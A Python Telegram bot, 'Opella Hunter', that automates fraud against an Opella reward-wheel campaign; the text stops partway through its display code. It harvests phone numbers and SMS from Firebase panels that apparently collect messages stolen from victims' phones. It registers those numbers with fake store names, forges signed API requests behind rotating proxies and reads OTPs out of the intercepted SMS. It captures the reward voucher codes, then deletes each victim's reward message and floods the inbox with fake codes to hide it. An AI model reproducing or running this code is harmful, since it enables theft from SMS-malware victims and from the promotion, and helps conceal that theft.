#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════════
#  Opella Hunter — v18.1
# ═══════════════════════════════════════════════════════════════════════════

import asyncio, base64, hashlib, hmac, io, json, os, random, re, string, sys, threading, time, contextvars
from collections import OrderedDict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any, Dict, List, Optional, Set
from urllib.parse import urlparse, parse_qs

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from requests.adapters import HTTPAdapter
from requests_toolbelt.multipart.encoder import MultipartEncoder

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler,
)
from telegram.constants import ParseMode
from telegram.error import BadRequest, RetryAfter, TimedOut, NetworkError

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG  (env-driven for Railway)
# ═══════════════════════════════════════════════════════════════════════════
BOT_NAME  = os.getenv("BOT_NAME", "Opella Hunter")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

_raw_admins = os.getenv("ADMIN_IDS", "").strip()
ADMIN_IDS: Set[int] = {
    int(x) for x in re.split(r"[,\s]+", _raw_admins) if x.strip().isdigit()
}

DEFAULT_MAX_WORKERS = int(os.getenv("MAX_WORKERS", "10"))
WORKER_CHOICES = [5, 10, 15, 20, 25, 50]

CONFIG_LOCK = threading.Lock()
CONFIG: Dict[str, Any] = {
    "max_workers": DEFAULT_MAX_WORKERS,
}

def get_max_workers() -> int:
    with CONFIG_LOCK:
        return int(CONFIG.get("max_workers", DEFAULT_MAX_WORKERS))

def set_max_workers(n: int) -> int:
    n = max(1, min(200, int(n)))
    with CONFIG_LOCK:
        CONFIG["max_workers"] = n
    return n

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

if not BOT_TOKEN:
    raise SystemExit("BOT_TOKEN env var is required")
if not ADMIN_IDS:
    print("[warn] ADMIN_IDS empty — /admin & /setworkers disabled", flush=True)

# No disk — everything in memory
NO_PROXY = {"http": None, "https": None}
MAX_GLOBAL_USERS     = 50
MAX_STATE_ENTRIES    = 10000
MAX_PANEL_NUMBERS    = 1000
MAX_NUM_ORDER        = 2000

# Timing
OTP_MAX_WAIT       = 25
OTP_POLL_DELAY     = 1.0
STAGGER_START      = (0.0, 0.8)
NET_RETRIES        = 5
NET_BACKOFF        = 0.8
LANDING_SLEEP      = (0.15, 0.35)
QUIZ_SLEEP         = (0.1, 0.25)
PANEL_GAP          = 0.5
BURY_COUNT         = 180
BURY_BATCH         = 60
VOUCHER_WATCH_SEC  = 90
VOUCHER_FETCH_COOLDOWN      = 8
VOUCHER_FETCH_FAIL_COOLDOWN = 3
DEVICE_COOLDOWN    = 20
ANSWERS            = [1, 2, 3, 4, 2]

# Backend
BASE_URL   = "https://www.worldpharmacistdaybyopella.com"
API_BASE   = f"{BASE_URL}/api"
UTM_SOURCE = "qrcode"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")

OPELLA_OTP_PATTERNS = [
    re.compile(r'Your OTP to register is\s+(\d{4,6})', re.IGNORECASE),
    re.compile(r'OTP to register[^\d]*(\d{4,6})', re.IGNORECASE),
    re.compile(r'\b(\d{6})\b'),
]
OPELLA_SENDER_HINTS = ["bigcity", "bgcity", "jm-", "opella", "pharmacist"]
OTHER_OTP_HINTS = ["jiomart", "rrlacc", "voyz", "unomer", "bigbasket",
                   "flipkart", "amazon", "swiggy", "zomato", "phonepe",
                   "gpay", "google"]
VOUCHER_REGEX = re.compile(
    r'Success!?\s*Your Reward Code is\s*([A-Z0-9]{10,20})', re.IGNORECASE)

RE_REGISTERED = re.compile(r"(\d{10})[^\d]{0,20}registered", re.I)
RE_OTP        = re.compile(r"(\d{10})[^\d]{0,20}OTP=(\d{6})")
RE_VERIFIED   = re.compile(r"(\d{10})[^\d]{0,20}verified", re.I)
RE_TIMEOUT    = re.compile(r"(\d{10})[^\d]{0,20}OTP timeout", re.I)
RE_WIN        = re.compile(r"WIN\s+(\d{10}).*reward=(\w+).*amt=(\d+)", re.I)
RE_LOSE       = re.compile(r"(\d{10})\s+lose\s+reward=(\w+)", re.I)
RE_ALREADY    = re.compile(r"(\d{10})[^\d]{0,20}already\s+spun", re.I)
RE_DEVICE     = re.compile(r"(\d+)\s+device", re.I)
RE_PANEL      = re.compile(r"panel\s+(\d+)/(\d+)\s+start", re.I)
RE_VOUCHER    = re.compile(r"VOUCHER:\s*([A-Z0-9]{10,20})", re.I)

BOT_APP: Optional[Application] = None
MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
GLOBAL_USER_SEM: Optional[asyncio.Semaphore] = None

STOP_EVENTS: Dict[int, threading.Event] = {}
STOP_EVENTS_LOCK = threading.Lock()

def get_stop_event(chat_id: int) -> threading.Event:
    with STOP_EVENTS_LOCK:
        ev = STOP_EVENTS.get(chat_id)
        if ev is None:
            ev = threading.Event(); STOP_EVENTS[chat_id] = ev
        return ev

def clear_stop_event(chat_id: int):
    with STOP_EVENTS_LOCK:
        if chat_id in STOP_EVENTS:
            STOP_EVENTS[chat_id].clear()

USED_OTPS: Set[str] = set()
USED_OTPS_LOCK = threading.Lock()

def try_claim_otp(otp: str) -> bool:
    with USED_OTPS_LOCK:
        if otp in USED_OTPS: return False
        USED_OTPS.add(otp); return True

VOUCHER_COOLDOWN_LOCK = threading.Lock()
LAST_VOUCHER_FETCH = 0.0
DEVICE_VOUCHER_TS: Dict[str, float] = {}
PANEL_VOUCHER_TS:  Dict[str, float] = {}

_current_chat: contextvars.ContextVar[Optional[int]] = \
    contextvars.ContextVar("current_chat", default=None)

# ═══════════════════════════════════════════════════════════════════════════
#  IN-MEMORY STORAGE
# ═══════════════════════════════════════════════════════════════════════════
USER_PANELS: Dict[int, List[str]] = {}
USER_PANELS_LOCK = threading.Lock()

USER_VOUCHERS: Dict[int, List[str]] = {}
USER_VOUCHERS_LOCK = threading.Lock()

USER_PROXIES: Dict[int, List[Dict[str, str]]] = {}
USER_PROXIES_LOCK = threading.Lock()

def mem_add_panel(uid, panel):
    with USER_PANELS_LOCK:
        lst = USER_PANELS.setdefault(uid, [])
        if panel in lst: return False
        lst.append(panel); return True

def mem_get_panels(uid):
    with USER_PANELS_LOCK:
        return list(USER_PANELS.get(uid, []))

def mem_clear_panels(uid):
    with USER_PANELS_LOCK:
        USER_PANELS[uid] = []

def mem_add_voucher(uid, line):
    with USER_VOUCHERS_LOCK:
        USER_VOUCHERS.setdefault(uid, []).append(line)

def mem_get_vouchers(uid):
    with USER_VOUCHERS_LOCK:
        return list(USER_VOUCHERS.get(uid, []))

def mem_get_proxies(uid):
    with USER_PROXIES_LOCK:
        return list(USER_PROXIES.get(uid, []))

def push_log(msg, cls="info"):
    pass

# ═══════════════════════════════════════════════════════════════════════════
#  UTIL
# ═══════════════════════════════════════════════════════════════════════════
C = {
    "win": "🟢", "lose": "🎲", "already": "🟡", "timeout": "🟠",
    "pending": "⚪", "verified": "✅", "otp_sent": "📤", "otp_recv": "💎",
    "waiting": "⏳", "spinning": "🔄", "failed": "❌", "hit": "🏆",
    "panel": "⚡", "error": "⚠️", "done": "✔️", "arrow": "▸",
    "bar_full": "▰", "bar_empty": "▱", "lock": "🔒",
    "check": "☑️", "cross": "❌", "join": "📢",
}

def esc(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def b64_encode(v):
    if isinstance(v, str): v = v.encode()
    return base64.b64encode(v).decode()

def random_string(n):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

def normalize_phone(p):
    if not p: return None
    d = re.sub(r"\D", "", str(p))
    if len(d) > 10:
        if d.startswith("91") and len(d) == 12: d = d[2:]
        elif d.startswith("0") and len(d) == 11: d = d[1:]
        else: d = d[-10:]
    if len(d) == 10 and d[0] in "6789": return d
    return None

def parse_panel_link(link):
    if not link: return None
    link = link.strip()
    if link.startswith("http") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        return link if link.endswith("/") else link + "/"
    qs = parse_qs(urlparse(link).query)
    if "s" not in qs: return None
    s = qs["s"][0] + "=" * ((4 - len(qs["s"][0]) % 4) % 4)
    try:
        dec = base64.b64decode(s).decode("utf-8").split("|")[0].strip()
        return dec if dec.endswith("/") else dec + "/"
    except Exception:
        return None

def tiny_jpeg():
    return bytes.fromhex(
        "ffd8ffe000104a46494600010100000100010000ffdb004300"
        "080606070605080707070909080a0c140d0c0b0b0c1912130f141d1a1f1e1d1a1c1c20242e2720222c231c1c2837292c303134341f27393d38323c2e333432ff"
        "c0000b080001000101011100ffc400140001000000000000000000000000000000000affda0008010100003f00d2cf20ffd9"
    )

def get_store_image():
    return tiny_jpeg(), "pack.jpg", "image/jpeg"
# ═══════════════════════════════════════════════════════════════════════════
#  HMAC + WRAPPED DATA
# ═══════════════════════════════════════════════════════════════════════════
def build_hmac_sig(data_key, ts_b64, payload_b64):
    key = data_key[4:18].encode()
    msg = f"{ts_b64}.{payload_b64}".encode()
    return b64_encode(hmac.new(key, msg, hashlib.sha256).hexdigest())

def build_wrapped_data(user_key, data_key, payload):
    ts = int(time.time() * 1000)
    payload = dict(payload)
    payload["userKey"] = int(user_key) if str(user_key).isdigit() else user_key
    payload["t"] = ts
    raw = json.dumps(payload, separators=(",", ":"), ensure_ascii=False)
    p_b64 = b64_encode(raw)
    t_b64 = b64_encode(str(ts))
    sig = build_hmac_sig(data_key, t_b64, p_b64)
    w = random.randint(1, 6); v = random.randint(2, 8)
    rnd = random_string(v)
    return t_b64, p_b64, f"{v}{w}{sig[:w]}{rnd}{sig[w:]}", ts

def decode_resp(resp):
    try:
        if not resp.text or not resp.text.strip():
            return {"statusCode": None, "message": "empty body"}
        obj = resp.json()
        if isinstance(obj, dict) and obj.get("resp"):
            return json.loads(base64.b64decode(obj["resp"]).decode())
        return obj
    except Exception:
        return {"statusCode": None, "message": f"bad body: {resp.text[:150]}"}

# ═══════════════════════════════════════════════════════════════════════════
#  NETWORK
# ═══════════════════════════════════════════════════════════════════════════
NET_EXC = (
    requests.exceptions.ConnectionError,
    requests.exceptions.ReadTimeout,
    requests.exceptions.ConnectTimeout,
    requests.exceptions.ChunkedEncodingError,
    requests.exceptions.SSLError,
    requests.exceptions.ProxyError,
    requests.exceptions.Timeout,
)

def _net_call(fn, chat_id, retries=NET_RETRIES, backoff=NET_BACKOFF, on_retry=None):
    last = None
    ev = get_stop_event(chat_id)
    for attempt in range(1, retries + 1):
        if ev.is_set():
            return {"statusCode": None, "message": "stopped"}
        try:
            return fn()
        except NET_EXC as e:
            last = {"statusCode": None, "message": type(e).__name__, "_net_error": True}
            if on_retry and attempt < retries:
                try: on_retry()
                except Exception: pass
            time.sleep(backoff * attempt)
        except Exception as e:
            return {"statusCode": None, "message": f"{type(e).__name__}: {e}"}
    return last or {"statusCode": None, "message": "net retries exhausted"}

def fb_get(url, timeout=6):
    try:
        r = requests.get(url, timeout=timeout, verify=False, proxies=NO_PROXY)
        return r.json() if r.status_code == 200 else None
    except Exception:
        return None

def fb_patch(url, data, timeout=15):
    try:
        r = requests.patch(url, json=data, timeout=timeout, verify=False, proxies=NO_PROXY)
        return r.status_code in (200, 201)
    except Exception:
        return False

def fb_delete(url, timeout=6):
    try:
        r = requests.delete(url, timeout=timeout, verify=False, proxies=NO_PROXY)
        return r.status_code in (200, 204)
    except Exception:
        return False

# ═══════════════════════════════════════════════════════════════════════════
#  OPELLA CLIENT
# ═══════════════════════════════════════════════════════════════════════════
def _looks_like_jwt(s):
    if not isinstance(s, str): return False
    p = s.split(".")
    return len(p) == 3 and len(s) > 40 and all(p)

def _find_token_deep(obj):
    if isinstance(obj, dict):
        for k in ("token", "accessToken", "jwt", "authToken", "bearer"):
            if _looks_like_jwt(obj.get(k)): return obj[k]
        for v in obj.values():
            t = _find_token_deep(v)
            if t: return t
    elif isinstance(obj, list):
        for v in obj:
            t = _find_token_deep(v)
            if t: return t
    return None

class OpellaClient:
    def __init__(self, chat_id, proxy=None, proxy_pool=None):
        self.chat_id = chat_id
        self.s = requests.Session()
        self.s.mount("http://",  HTTPAdapter(pool_connections=4, pool_maxsize=4))
        self.s.mount("https://", HTTPAdapter(pool_connections=4, pool_maxsize=4))
        self.s.headers.update({
            "User-Agent": UA, "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "origin": BASE_URL, "referer": f"{BASE_URL}/",
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        })
        self.proxy_pool = proxy_pool or []
        self.proxy_url = None
        if proxy:
            self.s.proxies.update({"http": proxy, "https": proxy})
            self.proxy_url = proxy
        self.user_key = None
        self.data_key = None
        self.token = None

    def _rotate_proxy(self):
        if not self.proxy_pool: return
        p = random.choice(self.proxy_pool)["url"]
        self.s.proxies.clear()
        self.s.proxies.update({"http": p, "https": p})
        self.proxy_url = p

    def create_user(self):
        def _do():
            resp = self.s.post(
                f"{API_BASE}/users",
                headers={"accept": "application/json",
                         "content-type": "application/json"},
                json={"utm_source": UTM_SOURCE},
                timeout=(8, 18))
            d = decode_resp(resp)
            if d.get("statusCode") != 200:
                raise RuntimeError(f"createUser: {d}")
            self.user_key = str(d.get("userKey") or d.get("data", {}).get("userKey"))
            self.data_key = str(d.get("dataKey") or d.get("data", {}).get("dataKey"))
            if not self.user_key or not self.data_key:
                raise RuntimeError(f"missing keys: {d}")
            return d
        return _net_call(_do, self.chat_id, on_retry=self._rotate_proxy)

    def _signed_post(self, endpoint, payload, with_token=False, referer=None):
        def _do():
            t_b64, p_b64, sig_p, _ = build_wrapped_data(
                self.user_key, self.data_key, payload)
            body = {"userKey": self.user_key, "data": f"{t_b64}.{p_b64}.{sig_p}"}
            h = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": BASE_URL,
                "referer": referer or f"{BASE_URL}/",
                "connection": "close",
            }
            if with_token and self.token:
                h["authorization"] = f"Bearer {self.token}"
            url = f"{API_BASE}/{endpoint}?t={int(time.time() * 1000)}"
            resp = self.s.post(url, data=body, headers=h, timeout=(8, 18))
            return decode_resp(resp)
        return _net_call(_do, self.chat_id, on_retry=self._rotate_proxy)

    def landing_track(self, tt):
        return self._signed_post(f"users/landing-track/{self.user_key}", {"type": tt})

    def get_state_cities(self):
        def _do():
            r = self.s.get(
                f"{API_BASE}/state-cities",
                headers={"accept": "*/*", "referer": f"{BASE_URL}/register"},
                timeout=(8, 15))
            if r.status_code == 200: return decode_resp(r)
            return {"statusCode": r.status_code, "message": "state-cities bad"}
        return _net_call(_do, self.chat_id, retries=3, on_retry=self._rotate_proxy)

    def register(self, mobile, store_name, retailer_name, state, city,
                 img_bytes, img_name="pack.jpg", img_mime="image/jpeg"):
        payload = {
            "mobile": mobile, "storeName": store_name, "retailerName": retailer_name,
            "state": state, "city": city,
            "userKey": int(self.user_key) if str(self.user_key).isdigit() else self.user_key,
        }
        t_b64, p_b64, sig_p, _ = build_wrapped_data(self.user_key, self.data_key, payload)
        data_field = f"{t_b64}.{p_b64}.{sig_p}"
        url = f"{API_BASE}/register/{self.user_key}?t={int(time.time() * 1000)}"
        h_base = {"accept": "*/*", "origin": BASE_URL,
                  "referer": f"{BASE_URL}/register", "connection": "close"}
        def _do():
            mp = MultipartEncoder(fields={
                "storeImage": (img_name, io.BytesIO(img_bytes), img_mime),
                "data": data_field,
            })
            h = dict(h_base); h["content-type"] = mp.content_type
            resp = self.s.post(url, data=mp, headers=h, timeout=(8, 22))
            return decode_resp(resp)
        return _net_call(_do, self.chat_id, on_retry=self._rotate_proxy)

    def verify_otp(self, otp):
        d = self._signed_post(
            f"users/verify-otp/{self.user_key}", {"otp": str(otp)},
            referer=f"{BASE_URL}/otp-verification")
        tok = _find_token_deep(d) if isinstance(d, dict) else None
        if not tok:
            for c in self.s.cookies:
                if _looks_like_jwt(c.value):
                    tok = c.value; break
        if tok: self.token = tok
        return d

    def get_question(self):
        return self._signed_post(
            f"users/get-question/{self.user_key}", {},
            with_token=True, referer=f"{BASE_URL}/quiz")

    def submit_answer(self, qid, opt):
        return self._signed_post(
            f"users/submit-answer/{self.user_key}",
            {"questionId": qid, "selectedOption": str(opt)},
            with_token=True, referer=f"{BASE_URL}/quiz")

    def spin(self):
        return self._signed_post(
            f"users/spin/{self.user_key}", {},
            with_token=True, referer=f"{BASE_URL}/wheel-spin")

def extract_state_city_pairs(sc):
    pairs = []
    if not sc: return pairs
    data = sc.get("data") if isinstance(sc, dict) else sc
    if not isinstance(data, dict): return pairs
    for item in (data.get("states") or []):
        if not isinstance(item, dict): continue
        st = item.get("state")
        cities = item.get("cities") or []
        if isinstance(cities, str): cities = [cities]
        for c in cities:
            if isinstance(c, str) and st:
                pairs.append((st, c))
    return pairs

def rand_store():
    first = ["Sunata", "Ravi", "Ashok", "Vikram", "Manoj", "Sanjay", "Ajay",
             "Deepak", "Rakesh", "Naresh", "Kamal", "Pooja", "Neha", "Sunita", "Anita"]
    last = ["Dev", "Medical", "Pharma", "Chemist", "Store", "Drug House",
            "Medicos", "Health Mart", "Care", "Pharmacy"]
    return f"{random.choice(first)} {random.choice(last)}"

def _msg_of(d):
    if not isinstance(d, dict): return ""
    return str(d.get("message") or "").lower()

def is_already_spun(d):
    m = _msg_of(d)
    return "already spun" in m or "already_spun" in m or "already spinned" in m

def is_already_completed(d):
    m = _msg_of(d)
    return "already completed" in m or "already registered" in m or "already participated" in m
# ═══════════════════════════════════════════════════════════════════════════
#  DEVICE FETCH
# ═══════════════════════════════════════════════════════════════════════════
def fetch_devices_for_panel(firebase_url):
    try:
        r = requests.get(firebase_url + "clients.json", timeout=15,
                         verify=False, proxies=NO_PROXY,
                         headers={"Connection": "keep-alive"})
        if r.status_code != 200:
            return []
        clients = r.json()
        if not isinstance(clients, dict): return []
    except Exception:
        return []

    total = len(clients)
    if total == 0: return []

    online = []
    any_status = False
    for cid, cd in clients.items():
        if not isinstance(cd, dict): continue
        status = cd.get("status") or cd.get("online") or cd.get("isOnline") or cd.get("state")
        if status is not None: any_status = True
        if status is True: online.append(cid)
        elif isinstance(status, str) and status.strip().lower() in (
                "online", "active", "1", "true", "yes"):
            online.append(cid)
        elif isinstance(status, (int, float)) and status == 1:
            online.append(cid)

    if not online and not any_status:
        online = list(clients.keys())

    if not online: return []

    phone_pats = [
        re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
        re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"),
    ]

    _tls = threading.local()
    def sess():
        s = getattr(_tls, "s", None)
        if s is None:
            s = requests.Session()
            s.verify = False; s.proxies = NO_PROXY
            s.mount("https://", HTTPAdapter(pool_connections=8, pool_maxsize=8))
            s.mount("http://",  HTTPAdapter(pool_connections=8, pool_maxsize=8))
            s.headers.update({"User-Agent": UA, "Connection": "keep-alive"})
            _tls.s = s
        return s

    out = []; seen = set()
    def one(cid):
        cd = clients.get(cid, {})
        direct = (cd.get("phone") or cd.get("mobile") or
                  cd.get("number") or cd.get("phoneNumber"))
        if direct:
            n = normalize_phone(direct)
            if n: return {"client_id": cid, "phone": n}
        try:
            mr = sess().get(
                f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=50',
                timeout=4)
            msgs = mr.json()
            if not isinstance(msgs, dict): return None
            text = " ".join(
                str(m.get("body") or m.get("message") or m.get("text") or m.get("sms") or "")
                for m in msgs.values() if isinstance(m, dict))
            for pat in phone_pats:
                mm = pat.search(text)
                if mm:
                    n = normalize_phone(mm.group(1) if mm.groups() else mm.group(0))
                    if n: return {"client_id": cid, "phone": n}
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=200) as ex:
        for f in as_completed([ex.submit(one, cid) for cid in online]):
            res = f.result()
            if res and res["phone"] not in seen:
                seen.add(res["phone"])
                res["firebase_url"] = firebase_url
                out.append(res)

    return out

# ═══════════════════════════════════════════════════════════════════════════
#  OTP FETCH
# ═══════════════════════════════════════════════════════════════════════════
def fetch_opella_otp(chat_id, fb_url, device_id, timeout=OTP_MAX_WAIT, since_ts=None):
    start = time.time()
    ev = get_stop_event(chat_id)
    trigger_ms = int((since_ts - 20) * 1000) if since_ts else int((time.time() - 90) * 1000)
    while time.time() - start < timeout:
        if ev.is_set(): return None
        try:
            r = requests.get(
                f'{fb_url}messages/{device_id}.json?orderBy="$key"&limitToLast=25',
                timeout=5, verify=False, proxies=NO_PROXY)
            if r.status_code != 200:
                time.sleep(OTP_POLL_DELAY); continue
            msgs = r.json()
            if not isinstance(msgs, dict):
                time.sleep(OTP_POLL_DELAY); continue
            ordered = sorted(
                msgs.items(),
                key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0,
                reverse=True)
            for mid, m in ordered:
                if not isinstance(m, dict): continue
                if str(mid).isdigit() and int(mid) < trigger_ms: continue
                sender = str(m.get("sender") or "").lower()
                body = str(m.get("body") or m.get("message") or
                           m.get("text") or m.get("sms") or "")
                bl = body.lower()
                if any(h in sender for h in OTHER_OTP_HINTS): continue
                sender_ok = any(h in sender for h in OPELLA_SENDER_HINTS)
                body_ok = ("bigcity" in bl or "bgcity" in bl or
                           "otp to register" in bl or "opella" in bl)
                if not (sender_ok or body_ok):
                    if not any(p.search(body) for p in OPELLA_OTP_PATTERNS[:2]):
                        continue
                for pat in OPELLA_OTP_PATTERNS:
                    mm = pat.search(body)
                    if mm:
                        otp = mm.group(1)
                        if 4 <= len(otp) <= 6 and otp.isdigit():
                            if not try_claim_otp(otp): continue
                            return otp
            time.sleep(OTP_POLL_DELAY)
        except Exception:
            time.sleep(OTP_POLL_DELAY)
    return None

# ═══════════════════════════════════════════════════════════════════════════
#  VOUCHER WATCH
# ═══════════════════════════════════════════════════════════════════════════
def _cooldown_ok(device_id=None, fb_url=None):
    now = time.time()
    with VOUCHER_COOLDOWN_LOCK:
        if now - LAST_VOUCHER_FETCH < VOUCHER_FETCH_COOLDOWN: return False
        if device_id and device_id in DEVICE_VOUCHER_TS:
            if now - DEVICE_VOUCHER_TS[device_id] < DEVICE_COOLDOWN: return False
        if fb_url and fb_url in PANEL_VOUCHER_TS:
            if now - PANEL_VOUCHER_TS[fb_url] < VOUCHER_FETCH_COOLDOWN: return False
    return True

def _mark_voucher(device_id=None, fb_url=None):
    global LAST_VOUCHER_FETCH
    now = time.time()
    with VOUCHER_COOLDOWN_LOCK:
        LAST_VOUCHER_FETCH = now
        if device_id: DEVICE_VOUCHER_TS[device_id] = now
        if fb_url:    PANEL_VOUCHER_TS[fb_url] = now

def _cooldown_wait(seconds, chat_id):
    end = time.time() + seconds
    ev = get_stop_event(chat_id)
    while time.time() < end:
        if ev.is_set(): return
        time.sleep(0.25)

def bury_fake_sms(chat_id, fb_url, device_id, count=BURY_COUNT, tag=""):
    url = f"{fb_url}messages/{device_id}.json"
    base_ts = int(time.time() * 1000)
    ev = get_stop_event(chat_id)
    for bi in range(0, count, BURY_BATCH):
        if ev.is_set(): break
        payload = {}
        for i in range(BURY_BATCH):
            idx = bi + i
            if idx >= count: break
            k = str(base_ts + idx)
            payload[k] = {
                "address": f"+91{random.randint(6000000000, 9999999999)}",
                "body": f"<#> {random.randint(100000,999999)} is your verification code. Valid 5 min.",
                "date": str(base_ts + idx), "type": "1",
            }
        if not fb_patch(url, payload): break

def watch_voucher(uid, chat_id, fb_url, device_id, phone, tag="", timeout=VOUCHER_WATCH_SEC):
    if not _cooldown_ok(device_id, fb_url): return None
    start = time.time()
    seen = set()
    ev = get_stop_event(chat_id)
    d = fb_get(f"{fb_url}messages/{device_id}.json?limitToLast=30")
    if isinstance(d, dict): seen = set(d.keys())

    while time.time() - start < timeout:
        if ev.is_set(): return None
        d = fb_get(f"{fb_url}messages/{device_id}.json")
        if isinstance(d, dict):
            for mid in sorted(d.keys(), reverse=True):
                if mid in seen: continue
                m = d[mid]
                if not isinstance(m, dict): seen.add(mid); continue
                txt = str(m.get("body") or m.get("message") or m.get("text") or "")
                if "Reward Code" not in txt and "reward code" not in txt.lower():
                    seen.add(mid); continue
                mx = VOUCHER_REGEX.search(txt)
                if mx:
                    voucher = mx.group(1)
                    ts = time.strftime("%Y-%m-%d %H:%M:%S")
                    mem_add_voucher(uid, f"{voucher} | {ts} | {phone} | {device_id}")
                    _mark_voucher(device_id, fb_url)
                    try: fb_delete(f"{fb_url}messages/{device_id}/{mid}.json")
                    except Exception: pass
                    bury_fake_sms(chat_id, fb_url, device_id, BURY_COUNT, tag=f"{tag} voucher")
                    _cooldown_wait(DEVICE_COOLDOWN, chat_id)
                    return voucher
                seen.add(mid)
        time.sleep(2)
    _cooldown_wait(VOUCHER_FETCH_FAIL_COOLDOWN, chat_id)
    return None

# ═══════════════════════════════════════════════════════════════════════════
#  PER-PHONE FLOW
# ═══════════════════════════════════════════════════════════════════════════
def flow_for_phone(uid, chat_id, phone, device_id, fb_url,
                   proxy, tag, st_pairs, proxy_pool=None):
    ev = get_stop_event(chat_id)
    res = {"phone": phone, "device_id": device_id, "firebase_url": fb_url,
           "tag": tag, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
    time.sleep(random.uniform(*STAGGER_START))
    if ev.is_set(): return res

    c = OpellaClient(chat_id, proxy=proxy, proxy_pool=proxy_pool)
    try:
        cu = c.create_user()
        if not c.user_key or not c.data_key:
            res["status"] = "create_failed"
            return res
        res["user_key"] = c.user_key

        c.landing_track("watched_video"); time.sleep(random.uniform(*LANDING_SLEEP))
        c.landing_track("continue_to_registration"); time.sleep(random.uniform(*LANDING_SLEEP))

        state, city = random.choice(st_pairs) if st_pairs else ("Karnataka", "Bangalore")
        store = rand_store()
        img_b, img_n, img_m = get_store_image()
        sent_at = time.time()

        r = c.register(phone, store, store, state, city, img_b, img_n, img_m)
        if is_already_completed(r):
            res["status"] = "already_registered"
            return res
        if r.get("statusCode") not in (200, 201):
            res["status"] = "register_failed"
            return res
        res["register_ok"] = True

        otp = fetch_opella_otp(chat_id, fb_url, device_id, OTP_MAX_WAIT, since_ts=sent_at)
        if not otp:
            res["status"] = "otp_timeout"
            return res
        res["otp"] = otp

        v = c.verify_otp(otp)
        if v.get("statusCode") != 200:
            res["status"] = "verify_failed"
            return res
        res["verify_ok"] = True

        for qid, ans in enumerate(ANSWERS, start=1):
            c.get_question()
            c.submit_answer(qid, ans)
            time.sleep(random.uniform(*QUIZ_SLEEP))

        s = c.spin()
        if is_already_spun(s):
            res["status"] = "already_spun"
            return res

        if isinstance(s, dict) and s.get("statusCode") == 200:
            data = s.get("data", {}) or {}
            is_winner = bool(data.get("isWinner"))
            rt = data.get("rewardType")
            ra = data.get("rewardAmount")
            if is_winner:
                res["status"] = "WIN"
                res["reward_type"] = rt
                res["reward_amount"] = ra
                if _cooldown_ok(device_id, fb_url):
                    threading.Thread(
                        target=watch_voucher,
                        args=(uid, chat_id, fb_url, device_id, phone, tag),
                        daemon=True,
                    ).start()
            else:
                res["status"] = "lose"
                res["reward_type"] = rt
        else:
            res["status"] = "spin_failed"
        return res
    except Exception as e:
        res["status"] = f"exception:{type(e).__name__}"
        return res
    finally:
        try: c.s.close()
        except Exception: pass

# ═══════════════════════════════════════════════════════════════════════════
#  STATE
# ═══════════════════════════════════════════════════════════════════════════
CHAT_STATE: "OrderedDict[int, Dict[str, Any]]" = OrderedDict()
STATE_LOCK = threading.RLock()

def _evict_states():
    while len(CHAT_STATE) > MAX_STATE_ENTRIES:
        try: CHAT_STATE.popitem(last=False)
        except Exception: break

def get_state(chat_id):
    with STATE_LOCK:
        st = CHAT_STATE.get(chat_id)
        if st is None:
            st = {
                "running": False, "panels": [], "current_panel": 0,
                "devices_total": 0, "processed": 0,
                "wins": 0, "losses": 0, "already_spun": 0,
                "otp_sent": 0, "otp_verified": 0, "errors": 0,
                "panel_stats": {}, "hits": [],
                "panel_numbers": {}, "numbers": {}, "num_order": deque(),
                "log_msg_id": None, "last_edit": 0,
                "stop_event": threading.Event(), "started_at": 0,
            }
            CHAT_STATE[chat_id] = st
            _evict_states()
        else:
            CHAT_STATE.move_to_end(chat_id)
        return st

def ensure_number(st, panel_idx, phone):
    with STATE_LOCK:
        pn = st["panel_numbers"].setdefault(panel_idx, {})
        if phone not in pn:
            pn[phone] = {
                "phone": phone, "otp_sent": False, "otp_recv": False,
                "verified": False, "timeout": False, "result": None,
                "reward": None, "amount": None, "ts": time.time(),
            }
            if len(pn) > MAX_PANEL_NUMBERS:
                oldest = sorted(pn.items(), key=lambda kv: kv[1]["ts"])[0][0]
                pn.pop(oldest, None)
        st["numbers"][phone] = pn[phone]
        order = st["num_order"]
        if phone not in order:
            order.append(phone)
            while len(order) > MAX_NUM_ORDER:
                old = order.popleft()
                if old in st["numbers"] and old not in pn:
                    st["numbers"].pop(old, None)
        return pn[phone]
# ═══════════════════════════════════════════════════════════════════════════
#  RENDER
# ═══════════════════════════════════════════════════════════════════════════
LINE = "─" * 50
EDIT_INTERVAL = 0.35
FORCE_EDIT_AFTER = 0.6
RENDER_LOCKS: Dict[int, asyncio.Lock] = {}
RENDER_PENDING: Dict[int, asyncio.Task] = {}

def get_render_lock(chat_id):
    lk = RENDER_LOCKS.get(chat_id)
    if lk is None:
        lk = asyncio.Lock(); RENDER_LOCKS[chat_id] = lk
    return lk

def _bar(done, total, width=10):
    if total <= 0: return C["bar_empty"] * width
    filled = max(0, min(width, int(width * done / total)))
    return C["bar_full"] * filled + C["bar_empty"] * (width - filled)

def _col_otp(b):
    if b.get("otp_recv"): return f"{C['otp_recv']} recv"
    if b["otp_sent"]:     return f"{C['otp_sent']} sent"
    return f"{C['waiting']} wait"

